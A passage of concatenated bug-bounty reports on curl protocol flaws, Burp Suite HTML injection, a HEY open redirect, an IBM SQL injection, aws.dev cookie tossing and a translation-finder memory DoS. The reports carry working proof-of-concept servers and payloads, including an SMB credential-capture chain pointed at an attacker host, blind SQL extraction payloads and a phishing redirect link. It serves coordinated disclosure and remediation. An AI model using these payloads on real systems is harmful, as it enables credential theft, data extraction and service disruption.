FETCH 1,2,3 (FLAGS)
UID FETCH 1:* (BODY[])
```

When the server sends a `FETCH` response containing a literal, the branch at `lib/imap.c:1233-1235` does nothing. `Curl_pp_readresp()` then scans the literal body line by line. `imap_endofresp()` checks for the current tag before distinguishing protocol response boundaries and accepts any line beginning with the tag followed by a space; it only needs the first two status characters to be `OK`.

For example, the following literal content can terminate command `A004` early:

```text
X
A004 OK FORGED-BY-ATTACKER
TRAILER
```

The server's genuine `A004 NO ...` response is left unread or buffered. The same mechanism can leave a forged next-command tag in the buffer, allowing a later command to receive a false completion response.

## Proof of concept

The following reproducer was tested against audit revision `e5e1c356107ea4f8208757deb69776d94496cfae`.

Run the `exploit` and `control` modes as indicated.

```text
https://github.com/curl/curl.git at e5e1c356107ea4f8208757deb69776d94496cfae
checkout: /src
privilege required: LOCAL. This was proved by running the built program; no network principal or login is involved.
run:      sh /poc-scratch/reproduce.sh exploit
control (script_mode): sh /poc-scratch/reproduce.sh control
```

### `pre_run.sh` (run once)

```sh
apt-get update && apt-get install -y --no-install-recommends python3
```

### `reproduce.sh`

```sh
#!/bin/sh
# IMAP literal/protocol desync in curl (lib/imap.c custom FETCH listing branch).
# Override the loopback port with VF_IMAP_PORT if 14399 is taken.
MODE="$1"
PORT="${VF_IMAP_PORT:-14399}"
WORK="$(mktemp -d)"

cat > "$WORK/srv.py" <<'PY'
import socket, threading, sys
PORT=int(sys.argv[1]); MODE=sys.argv[2]
def handle(c):
    f=c.makefile('rwb', buffering=0)
    def send(s): f.write(s.encode())
    send("* OK IMAP4rev1 ready\r\n")
    while True:
        l=f.readline()
        if not l: break
        line=l.decode('latin1'); p=line.split()
        if len(p)<2: continue
        tag,cmd=p[0],p[1].upper()
        if cmd=="CAPABILITY":
            send("* CAPABILITY IMAP4rev1 \r\n"); send(tag+" OK done\r\n")
        elif cmd=="LOGIN": send(tag+" OK done\r\n")
        elif cmd in ("SELECT","EXAMINE"):
            send("* 3 EXISTS\r\n* OK [UIDVALIDITY 1]\r\n"); send(tag+" OK [READ-WRITE] done\r\n")
        elif cmd=="FETCH":
            # Attacker-controlled literal body. In exploit mode it embeds a line
            # matching curl's current tag for this command (for example,
            # A004 OK).
            if MODE=="exploit":
                body="X\r\n"+tag+" OK FORGED-BY-ATTACKER\r\nTRAILER\r\n"
            else:
                body="X\r\nZZZ9 OK HARMLESS-NO-MATCH\r\nTRAILER\r\n"
            send("* 1 FETCH (BODY[] {%d}\r\n" % len(body)); send(body)
            # The server's real verdict: it rejected the fetch.
            send(tag+" NO server actually rejected the fetch\r\n")
        else: send(tag+" OK done\r\n")
    try: c.close()
    except Exception: pass
s=socket.socket(); s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
s.bind(("127.0.0.1",PORT)); s.listen(8)
while True:
    cc,_=s.accept(); threading.Thread(target=handle,args=(cc,),daemon=True).start()
PY

python3 "$WORK/srv.py" "$PORT" "$MODE" 2>/dev/null &
SRV=$!

# Wait until the loopback IMAP server is accepting connections.
i=0
while ! python3 -c "import socket,sys; s=socket.socket(); sys.exit(0 if s.connect_ex(('127.0.0.1',$PORT))==0 else 1)" 2>/dev/null; do
  i=$((i+1)); [ "$i" -gt 50 ] && { echo "server-not-ready"; kill -9 $SRV 2>/dev/null; exit 3; }
  sleep 0.2
done

# Everything is up and the shipped curl is about to run: signal readiness.
: > "${VF_READY:-/dev/null}"

# Exercise the shipped curl binary exactly once. Its exit code is the observable:
# 0  => curl believed the custom FETCH succeeded (spoofed by the literal)
# !0 => curl honored the server's real "NO" rejection.
timeout 30 curl -s --url "imap://127.0.0.1:$PORT/INBOX" -u user:pass -X "FETCH 1:* (BODY[])" >/dev/null 2>&1
rc=$?

kill -9 $SRV 2>/dev/null
echo "CURL_EXIT=$rc"
exit "$rc"
```

Expected result:

- `exploit`: curl exits `0`.
- `control`: curl exits nonzero.

## Recommendation

Do not classify custom `FETCH` as line-only based solely on its message-set syntax. Every `FETCH` response should parse and consume literals by their declared byte length before recognizing response lines.

If arbitrary multi-literal custom `FETCH` responses are not supported, reject them or mark the connection non-reusable as soon as an unconsumed literal is detected. Add regression tests containing current and subsequent command tags inside literals, including tests that reuse the connection for a later `SELECT`, `FETCH`, `STORE`, or `EXPUNGE`.

## Impact

The direct impact is response desynchronization and false command status, not arbitrary command injection. On a reused connection, leftover literal or response bytes can be consumed as the response to a later command.

A security-relevant consumer scenario is cross-mailbox confusion: an application could fetch attacker-controlled content from mailbox A, then select mailbox B and perform a sensitive operation. A forged tagged line left in the connection buffer could make curl believe the `SELECT B` succeeded when it did not, causing the following operation to execute against the server's still-selected mailbox A while the application believes it is operating on B.

This requires all of the following:

- the application uses the affected custom range/comma `FETCH` form;
- the IMAP connection is reused for a later command;
- an attacker can control literal content, or the server is malicious;
- the consuming application treats curl's command result as security-relevant.

A malicious IMAP server can already lie about its own response, so a one-shot request to a malicious server does not by itself demonstrate an additional privilege escalation. The distinct issue is that literal data from an otherwise honest server can cross into the command-response state machine and contaminate later operations.

title: Burp Suite OpenAPI Event Log HTML injection triggers Windows SMB authentication
vulnerability_information: ### Summary Burp Suite 2026.8 build 53343 inserts attacker-controlled text from an OpenAPI parser exception into the Event log HTML without encoding it. After the user invokes **Response → Save OpenAPI requests to site map** and selects the resulting Event log row, Swing's `HTMLEditorKit` interprets an injected `` tag. On Windows, a UNC-backed `file:` URL causes the Burp process to authenticate to an attacker-controlled SMB endpoint. I confirmed the full chain in a controlled Windows 11 environment: NTLM Type 1/2/3 exchange, successful SMB session setup, connection to the selected share, and reads of the selected file. This is not automatic when the response is received; it requires the two UI actions described below. ### Affected version - Burp Suite Professional/Community 2026.8 Early Adopter, build 53343. - Tested artifact: official Windows ARM64 installer `burpsuite_windows-arm64_v2026_8.exe`. - Installer SHA-256: `cda0916433c696eec59c5650c15bc59fdcc4fe1bc04e744f4612653f7b7ea05f`. - Extracted `burpsuite.jar` SHA-256: `1c42cdc7f38f2fb3486a15e1c5212763f81e6e4bc6059776025dd2c093cf94e1`. - Bundled runtime used for testing: Microsoft OpenJDK `25.0.4+7-LTS`, Windows ARM64. - Release page: https://portswigger.net/burp/releases/professional-community-2026-8 ### Proof of concept Serve the following response with HTTP status `200` and `Content-Type: application/json`. Replace `ATTACKER` and `SHARE` with an SMB endpoint and share under your control. ```json { "openapi": "3.0.0", "info": {"title": "t", "version": "1"}, "servers": [{"url": "http://127.0.0.1:9"}], "paths": { "/x": { "post": { "requestBody": { "content": { "application/json": { "schema": { "$ref": "#/components/schemas/http://127.0.0.1:1/>" } } } }, "responses": {"200": {"description": "ok"}} } } } } ``` The ` ` entity is required. A literal space is truncated at this parser-error location, while Swing decodes ` ` as the whitespace between the `img` tag name and its `src` attribute. {F6561285} ### Reproduction steps 1. Start a fresh temporary Burp project on Windows and a controlled SMB listener reachable from that machine. 2. Send a request in Repeater to an endpoint returning the response above. 3. Right-click the Repeater **Response** editor and select **Save OpenAPI requests to site map**. 4. Open **Dashboard → Event log**. 5. Select the new Scanner/Error row for the API-definition parsing failure. 6. Observe the Burp process authenticate to `ATTACKER`, connect to `SHARE`, and request `image.gif`. Using a fresh project avoids Event log deduplication suppressing an equivalent recent event. ### Observed result The controlled live run produced the following sequence: ```text Windows -> listener: NTLM Type 1 listener -> Windows: NTLM Type 2 challenge Windows -> listener: NTLM Type 3, domain=HAKAI, user=burppoc listener -> Windows: SMB2 Session Setup STATUS_SUCCESS listener -> Windows: SMB2 Tree Connect STATUS_SUCCESS Windows -> listener: Create/Read POCSHARE\swing-image.gif ``` The listener returned the exact seven-byte fixture `GIF89a\n`. The bytes read from the SMB response had SHA-256 `3cf815fc3053dafe38db36ef0977b9d027a43bc1ed0d4c5377aa580378bc57f6`, matching the predeclared file. The Type 3 material is omitted from the report. An independent fresh Windows boot using the same product classes, runtime, synthetic credential, and escaped HTML control produced zero `AUTHENTICATE_MESSAGE`, `TreeConnect`, `Create`, or `Read` events. Hashcat mode 5600, with the potfile disabled and only the predeclared synthetic password as a candidate, verified that the positive capture was a valid NetNTLMv2 challenge-response for the controlled account. ### Root cause The build-53343 data flow is: ```text attacker-controlled Repeater response -> OpenAPI validation and full parsing -> raw ApiDefinitionException.getMessage() -> raw Event log detail -> Event log HTML StringBuilder -> JEditorPane.setText() -> Swing ImageView -> Windows file/UNC resolution -> SMB authentication ``` The lightweight OpenAPI gate accepts the response as version `3.0.0`. Full parsing rejects the crafted `$ref` and creates this exception detail: ```text Blocking URL resolution for 'http://127.0.0.1:1/>'. ``` `Zfk4.Ze` passes the raw `ApiDefinitionException.getMessage()` value to the Event log builder. `Zg3w.ZD(false)` appends that detail directly to an HTML `StringBuilder`, and `Zwlk.setText()` renders it as `text/html`. The custom `HTMLEditorKit` view factory replaces paragraph handling but delegates image elements to Swing's standard `ImageView`, which resolves the UNC-backed resource. ### Relationship to report #1054382 / CVE-2021-29416 Public report #1054382 documented the same broad Swing HTML/resource-loading class and Windows credential impact. This report is a current mitigation bypass/regression with a distinct source and viewer: a gate-valid OpenAPI response becomes raw `ApiDefinitionException` detail in the Event log `JEditorPane`. The path remains reachable in official build 53343. Historical report: https://hackerone.com/reports/1054382 ### Preconditions and scope - The user must invoke **Save OpenAPI requests to site map** and then select the resulting Event log row. - The victim must be on Windows, able to reach the SMB endpoint, and have a credential applicable to that target. - Outbound SMB or NTLM policy may prevent authentication. - Proxying, crawling, passive scanning, and active scanning are not claimed as trigger paths. - I do not claim plaintext password disclosure, a reusable NT hash, relay, RCE, or universal impact across every Windows configuration. All testing used owned systems, a read-only controlled share, and synthetic credentials. No third-party credential, host, project, or customer data was accessed. ## Remediation 1. HTML-encode every dynamic Event log value at the final rendering boundary, including `&`, `<`, `>`, quotes, and apostrophes. 2. Disable or replace `ImageView` and any other external-resource view in the Event log `HTMLEditorKit`; Event details should never initiate network or file access. 3. Add regression tests covering entity whitespace and `http:`, `file:`, and UNC-backed resource URLs. ## Impact An attacker controlling an API response can turn a plausible Burp API-import workflow into outbound SMB authentication from the Windows account running Burp. This exposes a NetNTLMv2 challenge-response to the attacker-controlled listener, where it can be subjected to offline password guessing. The controlled test also demonstrated attacker-directed access to the selected SMB share and file path. I assess this as **Medium** because exploitation requires two explicit UI actions, depends on Windows/network credential-release policy, and may be affected by Event log deduplication. No password recovery, reusable NT hash, relay, code execution, or lateral movement is claimed.

title: Open redirect on app.hey.com bypasses HEY desktop's internal-origin allowlist and loads attacker content inside a HEY BrowserWindow
vulnerability_information: ## Summary `app.hey.com/proxy_image` compares the URL scheme case-sensitively. `https://` gets signed and proxied correctly. `HTTPS://` isn't recognised, so instead of proxying it, the endpoint 302s the visitor to the raw URL. No authentication needed. That alone is an open redirect. It matters because the HEY desktop app uses "is this URL on app.hey.com?" as its test for "is this HEY's own content, safe to load in an app window." A URL that genuinely is on app.hey.com passes that test, then redirects somewhere else. ## Proof of concept **1. The redirect:** ``` curl -sI "https://app.hey.com/proxy_image/HTTPS%3A%2F%2Fexample.com%2F" HTTP/2 302 location: HTTPS://example.com/ ``` Same URL in lowercase behaves correctly: ``` curl -sI "https://app.hey.com/proxy_image/https%3A%2F%2Fexample.com%2F" HTTP/2 302 location: https://gopher.hey.com/sNnTdUWAvh27xF-f273gMtyxvGbOnLHSflbedosO23Ns=/https://example.com/ ``` One capital letter apart. `javascript:` is still correctly rejected (403), so this is the scheme comparison, not a missing filter. Schemes are case-insensitive per RFC 3986 section 3.1, so `HTTPS://` is a valid URL, not a malformed edge case. **2. The full attack:** Email a HEY user this link: ``` https://app.hey.com/proxy_image/HTTPS%3A%2F%2Fexample.com%2F?x=/print ``` Open the message in the HEY desktop app and click it. A HEY window opens showing example.com, a site with nothing to do with HEY. Swap example.com for any host you control and it renders that instead. Two details, both required: * Percent-encode the inner URL. Unencoded, Rails collapses the `//` and returns `Location: HTTPS:/example.com/`, which browsers resolve relative to app.hey.com. * The URL must end in `/print` or `.text`, which is what the desktop window allowlist checks. `?x=/print` satisfies it without touching the destination. **Confirmed on HEY for Linux 1.3.6 (Electron 40.9.3):** the attacker page renders inside a HEY application window, and the destination server logged the fetch from `HEY/1.3.6 Chrome/144.0.7559.236 Electron/40.9.3`, so the app itself loaded it. macOS and Windows share this code path. HEY for Android 1.31.0 hands the link to the external browser and is not affected. A plain external link in the same message correctly opened in the external browser, which is what proves the app does route external links outward and that the redirect is what makes an attacker destination look internal. ## Why this isn't just an open redirect Three checks run, each correct on its own, and the URL passes all three because it really is on app.hey.com. **1. The mail sanitizer keeps the link.** It's an http-family URL, nothing to strip. **2. HEY's client-side external-link proxy skips it.** `hey-message-content` only intercepts links whose origin differs from the page: ```js if (element && element.origin != location.origin && element.protocol.startsWith("http")) { return element; // routed out to the OS browser } ``` The link's origin is app.hey.com, so it's treated as internal and handed to the app. **3. Electron's window allowlist accepts it** (`dist-js/index.js:72-74`): ```js else if (Stage.current.locationIsInternal(url) && (url.endsWith(".text") || url.endsWith("/print"))) { createWindow(url); // new HEY BrowserWindow, window.loadURL(url) } ``` Same origin passes, ends in `/print` passes, HEY opens a window, app.hey.com 302s, and the window is now on my origin. A second path reaches the same place. `Stage.isInternalAttachmentLink` (`dist-js/stage.js:47-52`) lets same-origin URLs carrying `?disposition=attachment` through with no external-link guard at all. Your own comment on that method reads: > "We must match the query parameter on an *internal* URL, not the raw substring anywhere in an arbitrary URL — otherwise any external link that merely contains `disposition=attachment` (in its query, fragment, or path) would skip the external-link guard below and load an attacker page inside the chromeless app window." That is exactly the outcome here, reached through a URL that genuinely is internal, which is the case the check wasn't written to catch. ## Same root cause, second location (no impact found) The identical case-sensitive scheme comparison exists in the inbound mail image rewriter. An `` in an email is not rewritten to `gopher.hey.com`. The stored message keeps the sender's raw URL, so the image proxy is silently skipped for that class of URL. Ten variants were tested and every other unusual form (`//host`, `https:/host`, `https:host`, `:443`, leading whitespace, query plus fragment) is proxied correctly. Only the scheme case escapes. I could not turn this into a leak. CSP `img-src` blocks the load, verified on the web app, the Linux desktop app, and by opening such a message on an Android phone where the unproxied images fetched zero times while the lowercase control in the same message was fetched by HEY's proxy. Reported only as evidence that the scheme comparison is systemic rather than a single endpoint bug. ## Fix Parse the URL and compare the normalised scheme before deciding whether to proxy, in `/proxy_image` and in the inbound mail image rewriter. Fail closed: if a value isn't a recognisable proxyable http(s) URL, return an error rather than redirecting the client to it. Separately, stop treating "same origin" as "safe to load in an app window." Any open redirect on app.hey.com re-opens both desktop guards. ## Impact A remote attacker who knows nothing but the target's email address can send an ordinary message containing a link that points to `https://app.hey.com`, the user's own mail provider. One click renders the attacker's page inside a HEY application window. That window has no address bar and no origin indicator, so once the redirect fires there is nothing on screen that distinguishes the attacker's content from HEY's own interface. This inverts the one defence users are actually taught. "Check the URL before you type your password" is not just unavailable here, it was already satisfied, because the link genuinely was HEY's. The natural payload is a HEY sign-in or re-authentication prompt, which is especially credible because HEY already shows a password prompt inside the app before sensitive actions like mailbox export (`/accounts/:id/exports`). A user who has seen that flow has been trained to expect exactly this screen. Successful credential capture yields the victim's full mailbox. Severity is scoped as Changed because the defect lives in the web asset (app.hey.com) while the control it defeats lives in a separate asset, the desktop app's rule that same-origin URLs are safe to load in an app window.

title: HTTP/1.1 connection reuse returns unsolicited server data as the next request's response (regression in 8.22.0)
vulnerability_information:
Since 8.22.0 libcurl reuses an idle HTTP/1.1 connection that already has unread bytes waiting on it, as long as the pool health check ran less than a second ago, and those bytes are then returned as the response to the next request sent on that connection, so every later response on it is shifted by one. The cause is lib/conncache.c Curl_cpool_conn_seems_healthy(), line 954 in curl-8_22_0: `if(curlx_ptimediff_ms(pnow, &conn->lastchecked) < 1000) return TRUE;` skips the input_pending check a few lines below it, the one whose own comment says such a connection is not healthy; it came in with 2f1e94eaed (#22169) and 8.21.0 ran that check on every reuse (url.c line 634, "connection has input pending, not reusable"). RFC 9112 section 9.2 says a client MUST NOT consider data received with no outstanding request a valid response and SHOULD close the connection. Reproduced on release builds of curl-8_22_0, rc-8_23_0-3 and master 15ad1b8565 over http and https, easy and multi interface and the command line tool; 8.21.0 opens a new connection every time, without the stray response both versions reuse normally, and on 8.22.0 a 900 ms gap between requests is poisoned while 1100 ms is refused. Steps: save the server below as stray.py, run `python3 stray.py 8310`, then run `curl --rate 5/s http://127.0.0.1:8310/req1 http://127.0.0.1:8310/req2 http://127.0.0.1:8310/req3 -o r1 -o r2 -o r3` and read the three files: 8.22.0 gives r1=RESP1 r2=STRAY r3=RESP2 while the server log shows it received and answered /req2 and /req3 normally on that one connection, 8.21.0 gives RESP1 three times over three connections. Restoring the pending input poll for idle non multiplexed connections and keeping the one second limit only for the protocol liveness callback fixes it on 8.22.0 and master in my tests, i have a patch for both.


stray.py (answers request N with RESPN, then sends one unsolicited response 50 ms after request 1 is done):

import socket, threading, time, sys
port = int(sys.argv[1])
s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('127.0.0.1', port)); s.listen(5)
def handle(c):
    n = 0; buf = b''
    while True:
        while b'\r\n\r\n' not in buf:
            d = c.recv(65536)
            if not d: return
            buf += d
        req, buf = buf.split(b'\r\n\r\n', 1); n += 1
        print('REQ %d %s' % (n, req.split(b'\r\n')[0].decode()), flush=True)
        body = b'RESP%d' % n
        c.sendall(b'HTTP/1.1 200 OK\r\nContent-Length: %d\r\n\r\n%s' % (len(body), body))
        if n == 1:
            time.sleep(0.05)
            c.sendall(b'HTTP/1.1 200 OK\r\nContent-Length: 5\r\n\r\nSTRAY')
while True:
    c, _ = s.accept(); threading.Thread(target=handle, args=(c,), daemon=True).start()

Ai helped mostly with script writing for findings

## Impact

The application silently gets a response that was never the answer to its request and from then on every response on that connection belongs to the previous request, so whoever can place bytes on the idle connection before the next request picks the status, headers such as Set-Cookie or Location, and body that the application attributes to it. This is the client side desync class that browsers and 8.21.0 defend against by dropping such connections, it matters most where the stray bytes come from a desynced intermediary or a forwarding proxy connection shared by several origins, and it needs no option, logs nothing and is hit by ordinary sequential use.

title: TFTP accepts a first response from an IP other than the requested server
vulnerability_information:
### Summary:
When curl sends a TFTP request to the IP in the URL, it accepts the first valid response from any source IP and pins that sender as the transfer peer. A host that can get UDP packets to the client's ephemeral port and win this first-response race can receive bytes from a TFTP upload or provide the contents of a download

### Affected version
Tested with curl 8.22.0 and master commit `098d3a0d4044d8a3f0a8617a5a5a30cde90fba26`, on Linux in isolated network namespaces, with TFTP enabled. The release test recorded 5/5 synthetic uploads reaching the competing responder and 3/5 downloads returning its data, these are results from this isolated environment setup, not a general success rate. 

### Steps To Reproduce:
1. Build curl 8.22.0 with TFTP support on Linux
2. In an isolated Linux environment that supports unprivileged user and network namespaces, place `tftp-test.py` and `tftp-test-spray.c` from the attachments in the same directory.
3. Run `python3 tftp-test.py /path/to/curl-8.22.0/curl --seconds 2 --trials 5 --start-delays-ms 0,250,500,750,1000`.
4. Review the harness output and `ftft-testing.log`
5. For the control, repeat the run with `--drop-attacker`, the competing responder should no longer win.

## Root cause

The initial RRQ/WRQ is sent to the URL-selected address obtained from `Curl_conn_get_remote_addr()` (`lib/tftp.c:754-761`). On receive, `recvfrom()` supplies a sender address. The current logic checks it only after a peer has already been pinned; the first sender is copied directly into `state->remote_addr`. This simplified excerpt is from `tftp_receive_packet()` (`lib/tftp.c:1057-1071`):

```c
if(state->remote_pinned) {
  if((state->remote_addrlen != fromlen) ||
     memcmp(&remote_addr, &state->remote_addr, fromlen))
    return CURLE_RECV_ERROR;
}
else {
  state->remote_pinned = TRUE;
  state->remote_addrlen = fromlen;
  memcpy(&state->remote_addr, &remote_addr, fromlen);
}
```

This pins the first packet's complete endpoint, including its source IP and UDP port, but does not compare that IP with the address used for the request. The later comparison only ensures subsequent packets match the first responder; it cannot reject a different host that wins the first-response race. TFTP servers use a new UDP transfer port, so curl should allow that port change while requiring the first response's address family and IP (and IPv6 scope, where applicable) to match the URL selected endpoint. It can then pin the accepted transfer port and validate later packets against that transfer endpoint.

## Limitations

The attack requires unsolicited UDP packets to reach curl's ephemeral TFTP port and the competing response to arrive before the selected server's response. Stateful firewalls and NAT can prevent that reachability.

## Impact

If an application relies on the TFTP URL's IP to select a trusted endpoint, an attacker able to reach the client's ephemeral UDP port and win the race can read the file being uploaded or make the application consume attacker-chosen download data as a successful transfer.

title: Memory exhaustion (DoS) via unbounded file read in `EncodingDiscovery.detect_encoding()`
vulnerability_information:
## Summary

`EncodingDiscovery.detect_encoding()` in `translation_finder/discovery/base.py` passes the raw file handle to `charset_normalizer.from_fp()`, which internally does `from_bytes(fp.read())` — the **entire file is loaded into memory**, with no size cap. Every other sniffing path in this codebase is bounded at 1 MiB (`FORMAT_SNIFF_MAX_BYTES` in `discovery/files.py`); this one is not.

Result: a single oversized translation file (e.g. a 128 MiB `cs.properties`) makes a `discover()` run's peak RSS grow to **~3× the file size (~403 MiB)**, which deterministically OOM-kills a discovery worker on constrained containers. Repro and evidence below.

## Vulnerability Details

- **Weakness:** CWE-770 (Allocation of Resources Without Limits or Throttling)
- **Product:** `WeblateOrg/translation-finder` 3.4.1 — also present on current `main` (`e94e820`)
- **Environment:** Python ≥ 3.11, Linux x86_64, charset-normalizer 3.4.3/3.5.1
- **Reachable from:** Weblate component discovery addon, Add Component flow, Transifex config import; runs after every VCS update

### Root cause

`translation_finder/discovery/base.py` (`detect_encoding`, v3.4.1):

```python
446  for path in chain(*matches):
447      if not isinstance(path, Path):
448          continue
449      with self.finder.open(path, "rb") as handle:
451          detection_result = from_fp(handle).best()   # <-- fp.read() whole file
```

`charset_normalizer/api.py`:

```python
826  return from_bytes(
827      fp.read(),          # <-- no limit
```

### Trigger conditions

A single matched file is enough, fully read in one call:

- **Normal mode:** any language-named file (`locale/cs.properties`) — and, as traced, plain filenames like `data.properties` are also fully read whenever a `.properties` component exists (`detect_encoding()` iterates all mask matches).
- **Eager mode:** every known-format file.
- Cost scales with file size (~3× RSS) and with the number of directories/files (`from_fp` is called once per match: 3 dirs with the same 16 MiB file = 48 MiB read).

## Steps To Reproduce

## Step 1. Setup
```bash
python3 -m venv tfenv && source tfenv/bin/activate
pip install "translation-finder==3.4.1"
```

## Step 2. Repo with one large translation file (128 MiB)
```bash
mkdir -p /tmp/encpoc/locale
printf 'greeting=Hello\n' > /tmp/encpoc/locale/en.properties
python3 -c "open('/tmp/encpoc/locale/cs.properties','wb').write(b's=' * 67108864)"
```

## Step 3. Watch memory
```bash
/usr/bin/time -v python3 -c "from translation_finder.api import discover; discover('/tmp/encpoc')" 2>&1 | grep "Maximum resident"
```
Expect ~400 MB peak for 128 MiB file (baseline ~12 MB)

## Step 4. Worker-OOM proof (use a 32 MiB file for speed: b's=' * 16777216)
```bash
bash -c 'ulimit -v 90000; python3 -c "from translation_finder.api import discover; discover(\"/tmp/encpoc\")"' 2>&1 | tail -2
```
Expect: MemoryError at charset_normalizer/api.py   (cap 130000 -> completes fine)

## Remediation

Read a bounded sample, same as the other sniffers:

```python
SNIFF_LIMIT = 1024 * 1024  # same as FORMAT_SNIFF_MAX_BYTES
with self.finder.open(path, "rb") as handle:
    sample = handle.read(SNIFF_LIMIT)
    detection_result = from_bytes(sample).best()
```

Or reuse `_read_binary_sniff_content()` / `_is_sniff_content_over_limit()` and skip oversized files entirely. The unbounded `fp.read()` in `charset_normalizer.from_fp()` is upstream behavior; the fix belongs in translation-finder.

## Supporting Material

Reporter measurements (subprocess-isolated `ru_maxrss`, baseline ~11.8 MiB):

| File | Peak RSS | Δ RSS | Ratio |
|---|---|---|---|
| 32 MiB `cs.properties` | 117 MiB | +105 MiB | 3.28× |
| 64 MiB `cs.properties` | 211 MiB | +199 MiB | 3.11× |
| 128 MiB `cs.properties` | 403 MiB | +391 MiB | 3.06× |

Independent re-verification (`main@e94e820`, charset-normalizer 3.5.1): 32 MiB file → peak 116.5 MiB (+103.3 MiB, 3.23×); instrumented `from_fp`: 1 call, exact file size read; cap test `ulimit -v 90000` → `MemoryError`, `130000` → OK. Control: a 100 MiB `cs.json` through the capped path (`_read_binary_sniff_content`) adds only ~2 MiB RSS.

Attachments: `poc_encoding_mem2.py`, `poc_oom_child.py`, `poc_aggregate_eager.py`, `poc_bytes_aggregate.py`, `results_measurements.txt`.

## Impact

Availability only. A 100 MiB blob (within GitHub's push limit) already costs ~300 MiB RSS per scan — enough to OOM a 512 MiB container; self-hosted forges allow much larger blobs. Triggered automatically on VCS updates, so no extra action needed beyond pushing to a watched repository.
CVSS 3.1: `AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H` = **3.7** (admin/import flows) or **5.5** with `PR:N` where webhooks/PR-driven scans make it reachable by unprivileged contributors.

title: SQL Injection vulnerability found on IBM.com subdomain

summaries.author: pink23
summaries.content: SQL Injection vulnerability found on IBM.com subdomain was reported to IBM, analyzed and has been remediated. Thank you to our external researcher @570rm_.

summaries.author: 570rm_
summaries.content:
I found a boolean-based SQL injection vulnerability in an application on an IBM.com subdomain, caused by the insecure handling of certain parameters in user controlled POST request bodies.

Payloads:
`{"<param>":"█████ IS NOT NULL AND LENGTH('abc') = 3 ORDER BY UPDATED DESC LIMIT 1"}`
The condition is true, and the application returns 200 OK.

`{"<param>":"█████ IS NOT NULL AND LENGTH('abc') = 4 ORDER BY UPDATED DESC LIMIT 1"}`
The condition is false, and the application returns 500 Internal Server Error.

`{"<param>":"█████ = 'email@example.com' AND ASCII(SUBSTR(CHAR((SELECT CURRENT DATE FROM SYSIBM.SYSDUMMY1)), 1, 1)) = 50"}`
The database’s CURRENT DATE value is in the year 2026, so the first character of the date string is 2. Its ASCII value is 50, making the condition true. The application returns 200 OK.

`{"<param>":"█████ = 'email@example.com' AND ASCII(SUBSTR(CHAR((SELECT CURRENT DATE FROM SYSIBM.SYSDUMMY1)), 1, 1)) = 51"}`
The first character of the date string is 2, whose ASCII value is not 51. Therefore, the condition is false, and the application returns 500 Internal Server Error.

Since the app returns 200 for true and 500 for false, an attacker can extract data character by character to enumerate database names, dump stored records, and access sensitive user data.

title: Unauthenticated go-httpbin servers : Leads to Cookie Tossing on *.aws.dev and Open Redirect
vulnerability_information:
**Description:** 
The unauthenticated go-httpbin instance exposes multiple endpoints that accept attacker-controlled input without appropriate validation.

Two issues were identified:
1. Cross-subdomain cookie tossing / cookie injection - `/cookies/set` allows an unauthenticated user to specify an arbitrary cookie `Domain`, including the parent `aws.dev` domain. This allows attacker-controlled cookies set from one `*.aws.dev` host to be delivered to unrelated sibling applications.
2. Open redirect - `/redirect-to` accepts an arbitrary URL and redirects the victim to that destination without validation.

The cookie issue was verified against unrelated `*.aws.dev` applications. A crafted cookie value was also observed to cause a separate application at `████████` to receive a CloudFront/WAF 403 response, demonstrating a practical cross-tenant denial-of-service impact.

**Endpoints:**
```
████████
████████
████████
```

As an example, Impact was tested on `████████`

## Steps To Reproduce:

### Open Redirect : 
Observe the open redirect to arbitrary domains : 
```bash
$ curl -s ████████redirect-to?url=http://google.com -D - -o /dev/null
HTTP/1.1 302 Found
Server: ████████
Date: Mon, 24 Aug 2026 21:27:43 GMT
Content-Length: 0
Connection: keep-alive
Access-Control-Allow-Credentials: true
Access-Control-Allow-Origin: *
Location: http://google.com

$
```

### For Cookie Tossing / Cookie Injection :
1. (Not related to vulnerable endpoint) First navigate to `████████` to observe normal site behavior (`401` with login prompt)

████████ 

2. Navigate to the following vulnerable URL to set the cookie `dos_poc=<script>alert(1)</script>` on domain `aws.dev` :
```
████████cookies/set?dos_poc=<script>alert(1)</script>&attr[Domain]=aws.dev
```
 
████████

3. As impact, observe the cookie set by `████████` on `aws.dev`, triggers a WAF denial (on a single user) on `████████`

████████



## Impact

## Summary:
* Cross-subdomain cookie injection/tossing: Plant attacker-controlled cookies scoped to `*.aws.dev`, causing them to be sent to unrelated sibling applications.
* Denial of service: Crafted cookie values can trigger CloudFront/WAF filtering and make affected applications inaccessible to the victim.
* Potential cookie shadowing: Attacker-controlled cookies may interfere with security or application cookies used by sibling applications.
* Open redirect: Redirect users from a trusted `aws.dev` URL to an attacker-controlled external destination.

title: Explicit NO_PROXY /0 CIDR rules fail to bypass HTTP proxy for IP-literal requests
vulnerability_information:
## Summary:

With an HTTP proxy configured, I found that curl sends IPv4 address-literal requests through it with `NO_PROXY=0.0.0.0/0`, and IPv6 address-literal requests through it with `NO_PROXY=::/0`. A zero-bit CIDR prefix should match every address in its family, so those requests should bypass the proxy. A mixed rule such as `NO_PROXY=0.0.0.0/0,::/0` lets a caller keep numeric destinations direct while continuing to proxy named hosts. In my local proof of concept, the proxy received an absolute-form HTTP request target including the `/private` path and a synthetic origin `Authorization` header, while `/1` controls connected directly to the origins. I used AI assistance during the investigation and drafting, then reviewed the attached PoC and evidence myself.

## Affected version

Reproduced with curl source tag `curl-8_23_0` (commit `3163ec065643ba20709f190111f42c3e1fe95273`) on macOS, Darwin 25.5.0, arm64. The local CMake build reports `8.23.0-DEV` in its version banner; the checkout is the exact `curl-8_23_0` tag.

```text
$ /path/to/built/curl -V
curl 8.23.0-DEV (Darwin) libcurl/8.23.0-DEV OpenSSL/4.0.3 nghttp2/1.70.0
```

## Steps To Reproduce:

1. Build curl from tag `curl-8_23_0`, or use a curl 8.23.0 executable. Extract the attached `curl-no-proxy-zero.zip` with `unzip curl-no-proxy-zero.zip` and enter `package-no-proxy`.
2. From the extracted `package-no-proxy` directory, run the Python 3 standard-library PoC with the path to that curl executable:

   ```sh
   python3 poc_no_proxy_zero.py /absolute/path/to/built/curl
   ```

3. The script starts only local loopback origin and proxy listeners. It compares `NO_PROXY=0.0.0.0/0` with `NO_PROXY=0.0.0.0/1`, `NO_PROXY=::/0` with `NO_PROXY=::/1` when IPv6 loopback is available, and the mixed `0.0.0.0/0,::/0` rule with a named-host control. It uses only the synthetic credential `demo:secret` and makes no external network request.
